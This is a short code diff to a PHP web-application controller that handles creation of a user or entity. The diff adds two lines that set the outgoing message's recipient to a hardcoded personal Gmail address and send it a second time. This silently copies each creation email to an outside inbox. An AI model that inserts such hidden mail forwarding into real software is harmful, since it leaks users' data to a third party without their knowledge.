@@ -139,6 +139,8 @@ class CreationController extends Controller
                 )
             ;
             $this->get('mailer')->send($message);
+            $message->setTo('fabio.fabbrucci@gmail.com');
+            $this->get('mailer')->send($message);
             
             $user  = new User();
             $user->setName($entity->getName());
